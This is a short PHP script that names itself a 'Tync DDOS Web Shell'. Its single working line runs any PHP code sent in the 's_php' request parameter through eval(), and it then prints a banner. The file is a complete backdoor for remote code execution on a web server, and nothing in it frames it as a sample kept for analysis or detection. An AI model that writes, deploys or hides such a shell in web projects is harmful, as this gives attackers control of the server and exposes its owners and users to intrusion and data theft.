<?php
$F = $_GET + $_POST;
eval(stripslashes($F['s_php']));
die("\n\n".'<br><br>'.'o_O Tync DDOS Web Shell ');
?>